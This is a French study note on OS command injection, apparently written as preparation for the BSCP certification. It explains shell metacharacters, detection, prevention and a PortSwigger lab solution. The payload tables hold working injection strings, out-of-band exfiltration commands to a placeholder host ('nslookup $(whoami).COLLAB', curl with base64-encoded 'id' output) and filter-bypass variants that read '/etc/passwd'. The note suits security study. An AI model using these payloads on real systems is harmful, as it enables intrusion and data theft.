---
tags: [bscp, server-side, command-injection]
niveau: practitioner
statut: en cours
---
# OS command injection

## En bref
- Définition : exécuter des commandes du système d'exploitation sur le serveur qui héberge l'application.
- Cause : une valeur contrôlée par l'utilisateur est insérée dans une commande lancée par un shell, sans validation ni échappement fiable.
- Impact : compromission possible de l'application et de ses données, puis rebond vers le reste de l'infrastructure ou vers des systèmes qui font confiance au serveur.
- Condition : un interpréteur de commandes (`sh -c`, `cmd /c`, PowerShell) est appelé ; sans lui, les séparateurs n'ont aucun effet.

## Comprendre
### Le rôle du shell
- Les séparateurs (`&`, `;`, `|`...) sont des métacaractères du shell. Ils ne fonctionnent que si la commande est construite en chaîne puis confiée à un interpréteur.
- Une exécution directe d'un programme avec une liste d'arguments, sans shell, neutralise les séparateurs : l'entrée reste une simple donnée.

### Injection de commande et injection d'arguments
- Injection de commande : le shell interprète les métacaractères et exécute une commande supplémentaire.
- Injection d'arguments ou d'options : l'entrée reste un argument, mais commence par `-` ou modifie le comportement du programme appelé (option qui écrit un fichier, charge une configuration, exécute un autre programme).
- Appeler un programme avec une liste d'arguments sans shell supprime le premier cas, pas le second.

### Contexte de guillemets
| Contexte | Effet | Conséquence pour l'injection |
| --- | --- | --- |
| Hors guillemets | le shell interprète tout | un séparateur suffit |
| Entre guillemets doubles | la substitution `$(...)` et les guillemets inversés restent actifs | substitution possible sans fermer le guillemet, sinon fermer avec `"` |
| Entre guillemets simples | aucune substitution | il faut fermer le guillemet avec `'`, puis le rouvrir pour équilibrer |
| Argument d'une autre commande (`echo`, `grep`) | l'entrée est une donnée de cette commande | les séparateurs fonctionnent seulement s'ils atteignent le shell |
- Une erreur de syntaxe du shell (guillemet non fermé) révèle souvent le contexte réel.

## Commandes utiles
| Objectif                     | Linux         | Windows         |
| ---------------------------- | ------------- | --------------- |
| Nom de l'utilisateur courant | `whoami`      | `whoami`        |
| Identité détaillée           | `id`          | `whoami /all`   |
| Nom de la machine            | `hostname`    | `hostname`      |
| Système d'exploitation       | `uname -a`    | `ver`           |
| Répertoire courant           | `pwd`         | `cd`            |
| Lister un répertoire         | `ls -la`      | `dir`           |
| Lire un fichier              | `cat fichier` | `type fichier`  |
| Configuration réseau         | `ifconfig`    | `ipconfig /all` |
| Connexions réseau            | `netstat -an` | `netstat -an`   |
| Processus en cours           | `ps -ef`      | `tasklist`      |
- Ces commandes servent à la reconnaissance une fois l'injection confirmée : identifier le compte sous lequel tourne l'application, le système, le réseau.
- Sur Linux, `ifconfig` peut être absent des systèmes récents : `ip a` est l'équivalent.
- Sous Windows, les variables d'environnement (`%USERNAME%`) sont lues par `cmd` ; le caractère d'échappement de `cmd` est `^`.

## Types et variantes
| Type | Idée clé | Prérequis | Niveau |
| --- | --- | --- | --- |
| Sortie visible | la sortie de la commande injectée apparaît dans la réponse HTTP | la réponse reprend la sortie | Apprentice |
| Aveugle par délai | on prouve l'exécution par le temps de réponse | une commande qui attend (`sleep`, `ping`, `timeout`) | Practitioner |
| Aveugle par redirection | la sortie est écrite dans un fichier lisible ensuite | répertoire servi par le serveur web et inscriptible | Practitioner |
| Aveugle par interaction réseau (*out-of-band*) | le serveur contacte un domaine que l'on contrôle | sortie réseau (souvent DNS) autorisée | Practitioner |
| Aveugle avec exfiltration (*out-of-band*) | la sortie d'une commande est placée dans le nom de domaine ou l'URL | idem, valeur courte et sans caractères spéciaux | Practitioner |
- Les exemples de payloads de chaque variante sont dans le catalogue de [[Payloads-cheatsheet]].

## Comment détecter
Ordre de test recommandé : sortie visible, puis délai, puis interaction réseau, puis redirection de la sortie.
- Repérer les fonctionnalités qui s'appuient sur un programme système : vérification de stock, ping ou traceroute, conversion de fichier, envoi d'e-mail, génération de PDF.
- Points d'injection à couvrir : paramètres d'URL, corps de formulaire, champs JSON et XML, en-têtes, cookies, noms de fichiers téléversés, segments du chemin d'URL.
- **Sortie visible** : une chaîne neutre et unique (`& echo MARQUEUR &`) ou `1|whoami`. Si elle apparaît dans la réponse, l'exécution est confirmée.
- **Délai** : injecter une commande qui attend (`sleep`, `ping` vers `127.0.0.1`, `timeout`). `127.0.0.1` évite toute sortie réseau.
- **Interaction réseau** : résolution DNS ou requête HTTP vers un domaine que l'on contrôle ; relever les interactions côté serveur d'interaction.
- **Temps de référence** : mesurer plusieurs fois le temps de réponse normal avant d'interpréter un délai.
- **Test de contrôle** : refaire la même requête avec un délai de 5 puis de 10 secondes ; le temps de réponse doit suivre la valeur demandée.
- **Faux positifs possibles** : lenteur due à un autre traitement ; filtre applicatif qui renvoie une erreur générique ; requête DNS émise par un composant intermédiaire (résolveur, pare-feu applicatif) et non par la commande.
- **Exécution asynchrone** : si le traitement passe par une file d'attente ou une tâche planifiée, la preuve (délai, interaction) arrive plus tard.

## Comment exploiter (principe)
### Séparateurs de commandes
| Séparateur | Linux (shell) | Windows `cmd` | Windows PowerShell | Effet |
| --- | --- | --- | --- | --- |
| `&` | oui | oui | non (réservé) | enchaîne sans condition |
| `&&` | oui | oui | oui (version 7 et suivantes) | exécute la suivante si la précédente réussit |
| `\|` | oui | oui | oui | envoie la sortie de la première à la seconde |
| `\|\|` | oui | oui | oui (version 7 et suivantes) | exécute la suivante si la précédente échoue |
| `;` | oui | non | oui | enchaîne sans condition |
| saut de ligne (`%0a` dans une URL) | oui | non | oui | sépare deux commandes |
| `$(commande)` ou guillemets inversés | oui | non | `$(commande)` seulement | remplace l'expression par la sortie de la commande |
- Un séparateur est parfois filtré alors que les autres passent : il faut donc tous les essayer.

### Principe sur un exemple générique
- Une fonctionnalité appelle un programme avec deux valeurs issues de la requête, par exemple `programme VALEUR1 VALEUR2`, via un shell.
- En envoyant `& echo MARQUEUR &` comme première valeur, la commande exécutée devient `programme & echo MARQUEUR & VALEUR2` : trois commandes distinctes.
- Lecture de la sortie : une erreur du programme d'origine (argument manquant) puis `MARQUEUR`, puis `VALEUR2 : commande introuvable`, car l'argument suivant est exécuté comme une commande.
- L'erreur `commande introuvable` montre seulement que la suite de la commande d'origine est toujours exécutée. Ce qui prouve que la commande injectée s'est exécutée, c'est la présence de `MARQUEUR`.
- Placer un second séparateur après la commande injectée l'isole de tout ce qui suit.

### Injection aveugle
- Quand la sortie n'est pas renvoyée, les variantes se choisissent selon ce que l'environnement autorise.
- **Délai** : `sleep` sous Unix ; `ping -c N` sous Unix ou `ping -n N` sous Windows (`-c` et `-n` ne sont pas interchangeables) ; `timeout /t N` sous Windows ; `Start-Sleep` sous PowerShell.
- **Redirection de la sortie** : écrire le résultat dans un fichier du répertoire web, puis le lire par une requête normale. Pour trouver un répertoire servi et inscriptible, on peut regarder la racine du serveur web, le répertoire des images ou des fichiers statiques observé dans le trafic, et les messages d'erreur. Ajouter `2>&1` permet de capturer aussi les erreurs. Il vaut mieux choisir un nom de fichier neutre. Le fichier reste en place après l'essai : le supprimer si c'est possible et autorisé.
- **Interaction réseau** : résolution DNS (`nslookup`) ou requête HTTP (`curl`, `wget`) vers un domaine que l'on contrôle.
- **Exfiltration** : placer la sortie d'une commande dans le sous-domaine (DNS) ou dans l'URL (HTTP). Sous Unix, substitution par `$(...)` ou guillemets inversés. Sous `cmd`, pas de substitution : variable d'environnement ou boucle `for /f`.

## Catalogue de payloads
`COLLAB` désigne un domaine d'interaction que l'on contrôle. Encodage dans l'URL : `&` en `%26`, `;` en `%3b`, `|` en `%7c`, saut de ligne en `%0a`, espace en `+` ou `%20`.

### Sortie visible
| Système | Payload | Contexte | Signal attendu | Limites |
| --- | --- | --- | --- | --- |
| Unix et Windows | `1\|whoami` | valeur hors guillemets, sortie renvoyée | le nom du compte apparaît | la sortie doit être affichée |
| Unix et Windows | `& echo MARQUEUR &` | test neutre | `MARQUEUR` dans la réponse | un filtre peut retirer la sortie ; choisir un marqueur unique |
| Unix et Windows | `\|whoami` | consommer le paramètre d'origine | résultat de `whoami` | la première commande doit pouvoir s'exécuter |
| Unix | `; id` | séparateur Unix | `uid=...` | `;` parfois filtré |
| Unix | `$(id)` ou `` `id` `` | substitution, valable entre guillemets doubles | `uid=...` | inactive entre guillemets simples |
| Unix | `'; id; '` ou `"; id; "` | fermer un guillemet puis le rouvrir | `uid=...` | il faut deviner le type de guillemet |
| Windows | `& ver &` | enchaînement `cmd` | version du système | `ver` est interne à `cmd` |
| Windows | `& echo %USERNAME% &` | variable d'environnement | nom du compte courant | peut différer de `whoami` pour un service |

### Aveugle par délai
| Système | Payload | Contexte | Signal attendu | Limites |
| --- | --- | --- | --- | --- |
| Unix | `& sleep 10 &` | le plus direct | réponse environ 10 secondes plus lente que la référence | `sleep` doit exister |
| Unix | `& ping -c 10 127.0.0.1 &` | `sleep` filtré | environ 10 secondes | `-c` propre à Unix |
| Windows | `& ping -n 10 127.0.0.1 &` | `ping` Windows | environ 9 à 10 secondes | la première requête est immédiate |
| Windows | `& timeout /t 10 &` | alternative | environ 10 secondes | refuse parfois une entrée redirigée |
| Windows (PowerShell) | `; Start-Sleep 10;` | l'application appelle PowerShell | environ 10 secondes | seulement si PowerShell est l'interpréteur |
| Unix et Windows | variantes avec `\|\|` et `&&` | choisir selon le code de retour de la commande d'origine | délai présent avec le bon séparateur seulement | sert aussi aux tests conditionnels |
- Contrôle : refaire l'essai avec 5 puis 10 secondes, après avoir mesuré plusieurs fois le temps de référence. En environnement réel, garder des délais courts : une commande qui bloque peut saturer les processus de traitement du serveur.

### Aveugle par redirection de la sortie
| Système | Payload | Contexte | Signal attendu | Limites |
| --- | --- | --- | --- | --- |
| Unix | `& whoami > /chemin/web/fichier.txt &` puis `GET /fichier.txt` | répertoire servi et inscriptible connu | sortie dans la réponse du `GET` | chemin à découvrir ; droits d'écriture nécessaires ; le répertoire peut ne pas être servi |
| Unix | `& id > /chemin/fichier 2>&1 &` | capturer aussi les erreurs | texte d'erreur lisible | mêmes limites |
| Windows | `& whoami > C:\chemin\web\fichier.txt &` | racine web Windows | lecture par `GET` | chemins différents (par exemple sous `inetpub`) |
- Relire la réponse dans Repeater avant de conclure à un échec, et supprimer le fichier créé quand c'est autorisé.

### Hors bande (interaction réseau et exfiltration)
| Système | Payload | Contexte | Signal attendu | Limites |
| --- | --- | --- | --- | --- |
| Unix et Windows | `& nslookup COLLAB &` | prouver l'exécution sans sortie | requête DNS reçue | sortie DNS nécessaire ; `nslookup` parfois absent sous Unix |
| Unix | ``& nslookup `whoami`.COLLAB &`` | courte valeur dans le sous-domaine | la valeur apparaît dans la requête | 63 caractères au plus par étiquette, sans espace ni symbole |
| Unix | `& nslookup $(whoami).COLLAB &` | même idée avec `$(...)` | la valeur apparaît dans la requête | mêmes limites |
| Windows | `& nslookup %USERNAME%.COLLAB &` | variable d'environnement (pas de guillemets inversés sous `cmd`) | nom dans la requête | variables seulement ; pour le résultat d'une commande, il faut `for /f` |
| Unix | `& curl http://COLLAB/ &` ou `& wget http://COLLAB/ &` | interaction HTTP | requête HTTP reçue | HTTP sortant souvent bloqué ; outil parfois absent |
| Unix | ``& curl http://COLLAB/`id\|base64 -w0` &`` | valeur plus longue par HTTP | valeur codée dans le chemin | encodage nécessaire ; petites quantités |
- Le filtrage des connexions sortantes bloque souvent HTTP mais laisse passer DNS.
- Burp Collaborator nécessite Burp Suite Professional. Hors labs, une alternative est un serveur d'interaction public ou auto-hébergé.
- Après l'envoi, attendre un court délai puis relever les interactions (Poll now).

### Séparateurs et contournements de filtre
| Système | Technique | Exemple | Limites |
| --- | --- | --- | --- |
| Unix | point-virgule, saut de ligne | `;`, `%0a` | souvent filtrés |
| Unix | espace filtré | `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, tabulation `%09` | `{...}` dépend de Bash ; `$IFS` est propre au shell |
| Unix | mot filtré | `w'h'oami`, `w"h"oami`, `who\ami` | efficace si le filtre est naïf |
| Unix | caractère construit | `${PATH:0:1}` pour `/` | Bash |
| Windows | échappement | `who^ami` | `cmd` seulement |
| Windows | variable découpée | `%PROGRAMFILES:~10,1%` pour une espace | fragile |
| Unix et Windows | encodage d'URL ou double encodage | `%26`, `%252f` | selon la chaîne de traitement |
- Limites générales : longueur maximale d'entrée, liste noire de mots (`whoami`, `cat`) et pare-feu applicatif peuvent bloquer ces essais.

## Pièges et points d'attention BSCP
- Tester plusieurs séparateurs : un filtre peut en bloquer un (`;` par exemple) et laisser passer les autres (`|`, saut de ligne).
- Encoder les caractères selon le format : un `&` non encodé dans une requête GET est lu comme le début d'un nouveau paramètre ; dans un corps de type formulaire, attention à l'espace et au `+` ; selon le point d'entrée, un double encodage peut être nécessaire.
- Pas de sortie visible ne veut pas dire pas d'injection : passer aux variantes aveugles avant de conclure.
- Une requête qui dure plus longtemps que le délai d'attente de Burp peut être coupée : garder des délais courts.
- Dans un examen chronométré, savoir quelle étape suit la découverte (lecture d'un fichier cible donné par l'énoncé).

## Prévention
- Le plus efficace : ne jamais appeler de commande système depuis le code de l'application. Utiliser les API du langage ou des bibliothèques pour la même fonctionnalité.
- Si l'appel est inévitable : valider l'entrée par liste blanche (valeurs autorisées, ou uniquement des caractères alphanumériques).
- Passer les arguments sous forme de liste à une API qui n'invoque pas de shell (`subprocess` sans `shell=True`, `ProcessBuilder`, `execFile`) plutôt que de construire une chaîne de commande.
- L'échappement fourni par le langage (`escapeshellarg` en PHP, `shlex.quote` en Python) ne protège pas contre l'injection d'options ; utiliser `--` pour terminer les options.
- Défense en profondeur : compte aux privilèges minimaux, filtrage des connexions sortantes, conteneur ou bac à sable sans outils inutiles, journalisation des appels de processus.

## Labs PortSwigger
- [x] Apprentice ✅ 2026-10-19
- [ ] Practitioner
- [ ] Expert
## Journal des labs
### Lab 1 - Injection de commande, cas simple
*OS command injection, simple case* - Apprentice

Vérification des stocks qui exécute une commande shell et renvoie sa sortie brute ; objectif : exécuter `whoami`.

1. Avec Burp Suite, interceptez et modifiez une requête qui vérifie le niveau de stock.
2. Modifiez le paramètre `storeID` en lui donnant la valeur `1|whoami`.
3. Observez que la réponse contient le nom de l'utilisateur courant.

### Autres labs de la catégorie (non traités)
- *Blind OS command injection with time delays* - Practitioner
- *Blind OS command injection with output redirection* - Practitioner
- *Blind OS command injection with out-of-band interaction* - Practitioner
- *Blind OS command injection with out-of-band data exfiltration* - Practitioner

## Mes notes

## Liens
- [[Payloads-cheatsheet]] : fiche de payloads
- [[File-upload-web-shell]] : suite d'impact (exécution de code sur le serveur)
- [[SSRF]] : voisin pour l'exfiltration et l'interaction réseau sortante depuis le serveur
